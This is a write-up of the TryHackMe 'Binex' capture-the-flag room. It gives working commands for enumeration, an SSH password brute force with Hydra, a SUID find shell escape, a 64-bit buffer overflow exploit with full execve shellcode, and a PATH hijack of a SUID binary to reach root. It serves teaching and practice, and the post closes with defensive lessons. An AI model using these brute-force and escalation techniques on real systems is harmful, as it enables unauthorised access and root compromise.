---
title: 'Binex'
target: 'TryHackMe — Binex'
difficulty: 'hard'
date: 2026-08-27
summary: 'Three privilege escalation paths on a single Ubuntu box — SUID find abuse for a lateral shell, a 64-bit stack buffer overflow with manual offset calculation and injected shellcode, and PATH variable manipulation to hijack a call to ps.'
role: 'pentest'
tags: ['SUID', 'Buffer overflow', 'PATH hijack', 'GDB', 'Hydra', 'enum4linux', 'GTFObins', 'Shellcode', 'x86_64']
problem: 'An Ubuntu 18.04 machine with SSH and SMB exposed. Four local users exist, and the goal is to chain from initial access through three distinct privilege escalation techniques — SUID binary abuse, a stack buffer overflow, and PATH variable manipulation — to reach root.'
action: 'Enumerated users via enum4linux, brute-forced SSH with Hydra, then escalated through three paths: exploited a SUID find binary via GTFObins to pivot to des, manually calculated a 616-byte offset to RIP in a vulnerable bof binary and injected x86_64 execve shellcode to land a shell as kel, then hijacked the PATH so a SUID root binary calling ps executed /bin/bash instead.'
outcome: 'Full root compromise through three independent escalation chains, each demonstrating a different class of Linux privilege escalation — SUID abuse, memory corruption, and environment variable manipulation.'
draft: false
---

Binex is a three-part privilege escalation room where every step uses a
different technique. The box runs Ubuntu 18.04 with four local users, and the
path from initial access to root goes through SUID binary abuse, a stack
buffer overflow with shellcode injection, and PATH variable manipulation. No
single trick gets you to root — each escalation lands you on the next user's
account, and the techniques get progressively harder.

## Enumeration

Starting with an nmap scan against the target:

```bash
nmap -T4 -p- --min-parallelism 100 --max-retries 2 10.10.147.155
```

![nmap scan results showing ports 22, 139, and 445 open](/writeups/thm-binex/01-nmap-scan.png)

Three ports come back: **SSH (22)**, **netbios-ssn (139)**, and
**microsoft-ds (445)**. SSH is the way in, and the SMB ports give us a way
to enumerate users before we even try credentials.

Running enum4linux to pull local user accounts from SMB:

```bash
enum4linux 10.10.147.155
```

![enum4linux user enumeration showing kel, des, tryhackme, and noentry](/writeups/thm-binex/02-enum4linux-users.png)

Four local users: **kel** (S-1-22-1-1000), **des** (S-1-22-1-1001),
**tryhackme** (S-1-22-1-1002), and **noentry** (S-1-22-1-1003). The
`noentry` name is a hint that one account isn't worth pursuing. The
`tryhackme` account is the obvious first target — it's the default account
name for guided rooms, and likely has a weak password.

## Initial access — SSH brute force

With a username in hand, Hydra against SSH with rockyou:

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.74.134:22 -v -f -V -t 15
```

![Hydra SSH bruteforce finding tryhackme:thebest](/writeups/thm-binex/03-hydra-bruteforce.png)

Valid credentials: **tryhackme:thebest**. Logging in confirms Ubuntu 18.04.3
LTS running kernel 4.15.0-74-generic on x86_64:

![SSH login to THM_exploit showing Ubuntu 18.04.3 LTS banner](/writeups/thm-binex/04-ssh-login.png)

The hostname is `THM_exploit`, and the system info banner gives us the
exact kernel version — useful context for whether kernel exploits are in
play (they're not here, but always worth noting).

## Privilege escalation 1 — SUID find (tryhackme → des)

The first escalation technique is SUID binary abuse. Searching for SUID
binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![SUID file listing with /usr/bin/find owned by des highlighted](/writeups/thm-binex/05-suid-find-listing.png)

Most SUID binaries here are standard system files owned by root. The
exception is `/usr/bin/find` — it's owned by **des:des** with permissions
`-rwsr-sr-x`, 238080 bytes, dated Nov 5 2017. That's unusual: `find`
shouldn't be SUID, and being owned by `des` rather than root means
exploiting it drops us into a des shell, not root.

GTFObins documents the technique for SUID find: use `-exec` to spawn a
shell that inherits the effective UID:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![find SUID exploit giving des shell, showing flag.txt and credentials](/writeups/thm-binex/06-find-exploit-des-flag.png)

Running `id` confirms `euid=1001(des) egid=1001(des)` — we're now operating
as des. The flag was retrieved from `/home/des/flag.txt`, along with
credentials for the des account.

The `-p` flag on `/bin/sh` is critical here — without it, bash drops
privileges on startup and the SUID bit is wasted. The `-quit` on find
ensures it stops after the first match rather than spawning a shell for
every file it finds.

## Privilege escalation 2 — buffer overflow (des → kel)

This is the hardest part of the room. In `/home/des/`, there's a `bof`
binary (SUID root, `-rwsr-xr-x 1 root root 8392`) and its source
`bof64.c`:

![bof64.c source showing char buffer 600, read 0 buffer 1000](/writeups/thm-binex/07-bof64-source.png)

The source is straightforward:

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
    char buffer[600];
    int characters_read;
    printf("Enter some string:\n");
    characters_read = read(0, buffer, 1000);
    printf("You entered: %s", buffer);
    return 0;
}

void main(){
    setresuid(geteuid(), geteuid(), geteuid());
    setresgid(getegid(), getegid(), getegid());
    foo();
}
```

The vulnerability: `buffer` is 600 bytes, but `read()` accepts up to 1000.
That's a 400-byte overflow. The `main()` function calls `setresuid` and
`setresgid` with the effective UID/GID before calling `foo()` — since the
binary is SUID root, any shell we spawn inherits root's real UID. But
the binary is owned by root and kel's home holds the next flag, so the
escalation path goes through kel.

### Confirming the crash

First, verify the overflow actually crashes:

![Segmentation fault after feeding excessive A characters to ./bof](/writeups/thm-binex/08-buffer-overflow-segfault.png)

Feeding a short input (`aaaaa`) works normally. Feeding a long string of A's
triggers a segfault — the overflow overwrites the saved return address on the
stack, and execution jumps to `0x4141414141414141` (AAAA... in ASCII), which
isn't a valid address.

### Finding the offset to RIP

The next step is finding exactly how many bytes of padding reach the saved
return pointer (RIP). In GDB, after overflowing with A's
(`0x41`), the registers show RIP has been overwritten:

![GDB info registers showing RIP overwritten with 0x4141414141414141](/writeups/thm-binex/09-gdb-registers-rip.png)

RIP is `0x555555555484e` pointing into `foo+84`, and RBP is filled with
`0x4141414141414141` — the A's have overflowed past the buffer and through
the saved frame pointer into the return address.

To find the precise offset, a manual approach using Python to generate
strings of increasing length:

![Python generating A strings from 600 to 621 characters to find exact crash point](/writeups/thm-binex/10-python-offset-testing.png)

Testing with `A*600` doesn't crash (fits in the buffer), but increasing
the length byte by byte reveals that at **621 bytes**, the A's fully
overwrite RIP. That means the offset from the start of the buffer to the
saved return pointer is **616 bytes** (621 minus 5 bytes that partially
overwrite, accounting for the 8-byte RBP that sits between the buffer and
the return address on x86_64).

For confirmation, Metasploit's `pattern_create.rb` generates a
non-repeating pattern:

![Locating pattern_create.rb with locate and find commands](/writeups/thm-binex/11-pattern-create-locate.png)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Feeding the pattern to `./bof` in GDB and checking registers after the
crash:

![GDB registers after pattern_create input showing unique values in RBP and RIP](/writeups/thm-binex/12-gdb-pattern-registers.png)

RBP holds `0x4134754133754132` and RIP points to `0x55555555484e <foo+84>`.
The pattern in RBP can be fed back to `pattern_offset.rb` to confirm the
616-byte offset.

### Building the exploit

The exploit layout for a 616-byte offset on x86_64:

1. **NOP sled** — `\x90` bytes that slide execution forward to the shellcode
2. **Shellcode** — 24 bytes of x86_64 `execve("/bin//sh")`:
   `\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`
3. **Padding** — A's to fill out to exactly 616 bytes
4. **Return address** — a stack address pointing into the NOP sled, in
   little-endian format

Examining the stack in GDB to find a reliable return address:

![GDB stack memory showing shellcode bytes between A padding, with addresses highlighted](/writeups/thm-binex/13-gdb-stack-shellcode.png)

The stack dump shows the pattern clearly: `0x4141414141414141` (the A
padding) fills most of the buffer, and then the injected bytes appear —
those are the shellcode sitting between the NOP sled and the trailing
padding. The address `0x7fffffffe308` falls inside the NOP sled region,
making it a suitable return address.

The final exploit:

```bash
(python -c "print('\x90'*(616 - 24 - 100) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*100 + '\x08\xe3\xff\xff\xff\x7f\x00\x00');"; cat) | ./bof
```

Breaking it down: 492 bytes of NOP sled (`616 - 24 - 100`), 24 bytes of
shellcode, 100 bytes of A padding, then the return address
`0x7fffffffe308` in little endian. The `cat` at the end keeps stdin open
so the spawned shell doesn't immediately exit.

![Successful buffer overflow exploit giving kel shell with flag and credentials](/writeups/thm-binex/14-bof-exploit-kel-flag.png)

`id` confirms `uid=1000(kel)` — the overflow landed. The flag was
retrieved from `/home/kel/flag.txt`, along with credentials for the kel
account.

## Privilege escalation 3 — PATH manipulation (kel → root)

In `/home/kel/`, there's another SUID binary: `exe` (`-rwsr-xr-x 1 root
root 8392`). Its source `exe.c` reveals:

```c
setresuid(geteuid(), geteuid(), geteuid());
system("ps");
```

It calls `setresuid` with the effective UID (root, because of the SUID
bit), then runs `system("ps")`. The critical detail: `ps` is called
without an absolute path. `system()` uses the shell's `PATH` to resolve
the binary name, so if we prepend a directory we control to `PATH` and
place our own `ps` there, the SUID binary will execute our version as
root.

Testing the binary first to confirm its behaviour:

![Running ./exe as kel showing ps output with process listing](/writeups/thm-binex/15-exe-binary-test.png)

It runs `ps` and prints the process table. Now the exploit:

```bash
export PATH=/tmp:$PATH
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
cd /home/kel
./exe
```

![PATH manipulation: exporting /tmp first, creating fake ps, running ./exe to get root shell and root flag](/writeups/thm-binex/16-path-hijack-root.png)

Prepending `/tmp` to `PATH` means the shell looks there first for any
command. Creating `/tmp/ps` containing `/bin/bash` makes the `system("ps")`
call execute bash instead of the real `ps`. Since the binary already called
`setresuid(0, 0, 0)`, that bash session runs as root.

The root flag was retrieved from `/root/root.txt`. The room's sign-off:
"The room is built with love. DesKel out."

## What I took from this

The three escalation techniques here sit at three different points on the
difficulty spectrum, and each teaches a different lesson. The SUID find
exploit is essentially a lookup — check GTFObins, run the command, get a
shell. It's important to know, but it's a knowledge check, not a skills
test. The PATH manipulation is a step up: you need to understand how
`system()` resolves commands and why a missing absolute path in a SUID
binary is exploitable. But the buffer overflow is where the actual learning
happens — calculating the offset manually by incrementing the input length,
confirming with pattern_create, finding a return address in GDB, laying
out the NOP sled and shellcode, getting the endianness right, and keeping
stdin open with `cat`. Every byte matters, and one wrong count means a
segfault instead of a shell.

The room also reinforces why SUID binaries are such a persistent attack
surface. All three escalations depend on binaries with the SUID bit set —
`find`, `bof`, and `exe`. The fix in every case is the same: don't set
SUID on binaries that don't need it, and when you must, use absolute paths
and validate input.
